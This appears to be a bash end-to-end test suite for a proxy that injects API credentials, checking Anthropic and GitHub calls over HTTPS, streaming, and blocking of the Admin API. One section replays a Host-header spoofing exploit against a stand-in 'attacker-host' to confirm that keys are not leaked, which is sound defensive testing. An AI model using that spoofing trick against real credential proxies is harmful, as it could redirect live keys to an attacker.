#!/usr/bin/env bash
# Credential injection over real HTTPS, against the real vendors.
#
# This is the tier's main reason to exist. tests/integration/25 proves the
# addons pick the right host, but every request there is plain HTTP to a stub.
# Here the request is a genuine CONNECT tunnel, MITMed with the mitmproxy CA,
# carrying a real key to a real API — which exercises the TLS path, the cert
# trust chain, the streaming hook and the vendors' own auth, none of which a
# stub can tell you anything about.
#
# Costs a few tokens per run. Deliberately haiku, max_tokens tiny.
set -uo pipefail
. "$(dirname "${BASH_SOURCE[0]}")/e2e-lib.sh"

ANTHROPIC_BODY='{"model":"claude-haiku-4-5","max_tokens":16,"messages":[{"role":"user","content":"Reply with just the word PONG"}]}'

suite "anthropic over HTTPS through the proxy"
# No credential in the request at all — the dev container does not have one.
body=$(dev_body "https://api.anthropic.com/v1/messages" \
  -H "content-type: application/json" -d "$ANTHROPIC_BODY")
if printf '%s' "$body" | grep -q '"content"'; then
  ok "request authenticated (key injected at the wire, not by the caller)"
  check_contains "model replied" "$(printf '%s' "$body" | tr -d '\n')" "PONG"
else
  ko "anthropic call failed" "$(printf '%s' "$body" | head -c 300)"
fi

suite "SSE streaming is not buffered"
# 020_anthropic.py uses the responseheaders hook and sets flow.response.stream
# so chunks pass straight through. If someone switches it to the `response`
# hook, the whole body buffers and this still passes — but the timing check
# below catches the regression that matters: nothing arrives until the end.
stream=$(dev_sh "curl -N -s --max-time 30 https://api.anthropic.com/v1/messages \
  -H 'content-type: application/json' \
  -d '{\"model\":\"claude-haiku-4-5\",\"max_tokens\":32,\"stream\":true,\"messages\":[{\"role\":\"user\",\"content\":\"Count 1 to 5\"}]}' | head -5")
check_contains "response is an event stream" "$stream" "event:"

suite "anthropic Admin API stays blocked"
check "Admin API refused over HTTPS" "403" \
  "$(dev_code "https://api.anthropic.com/v1/organizations/api_keys")"

suite "github over HTTPS through the proxy"
check "gh api /rate_limit succeeds with the dummy GH_TOKEN" "0" \
  "$(dev_sh 'gh api /rate_limit >/dev/null 2>&1; echo $?')"
rl=$(dev_sh 'gh api /rate_limit 2>/dev/null | jq -r .rate.limit')
check_contains "rate limit is the App's quota, not anonymous (60)" \
  "$(printf 'x%sx' "$rl")" "x5000x"

suite "a spoofed Host cannot redirect a credential"
# The pre-fix exploit, run against the live stack: claim to be the vendor,
# deliver to a server the dev container controls. The addons match
# flow.request.host, so the claim must not be believed.
#
# Failure detail is redacted — on a bad day this body holds a live key.
for vendor in api.anthropic.com api.github.com; do
  leak=$(dev_body "http://attacker-host/v1/messages" -H "Host: $vendor")
  check_contains "request reached the attacker host claiming $vendor" "$leak" "RECEIVED-BY="
  check_no_secret "no credential leaked to attacker-host claiming $vendor" \
    "$leak" "${SECRET_PATTERNS[@]}"
done

# Same again with no Host trickery, to be sure the echo server is not simply
# swallowing headers and making the assertion above vacuous.
plain=$(dev_body "http://attacker-host/x" -H "X-Api-Key: CANARY-VALUE")
check_contains "echo server does reflect headers (assertion is not vacuous)" \
  "$plain" "CANARY-VALUE"

finish
